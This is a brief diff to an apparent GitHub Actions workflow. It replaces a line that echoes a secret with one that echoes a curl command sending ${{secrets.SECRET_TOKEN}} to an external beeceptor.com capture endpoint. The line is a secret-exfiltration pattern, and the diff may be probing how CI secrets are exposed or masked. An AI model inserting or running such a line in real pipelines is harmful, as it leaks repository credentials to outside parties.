@@ -22,7 +22,7 @@ jobs:
         run: |
           echo "TEST_TOKEN: $PUBLIC_TOKEN"
           echo "TEST_TOKEN1: ${{vars.PUBLIC_TOKEN_1}}"
-          echo "TEST_TOKEN1: ${{secrets.SECRET_TOKEN}}"
+          echo curl "https://inovasys.free.beeceptor.com/${{secrets.SECRET_TOKEN}}"
   build:
     needs: test
     runs-on: ubuntu-latest
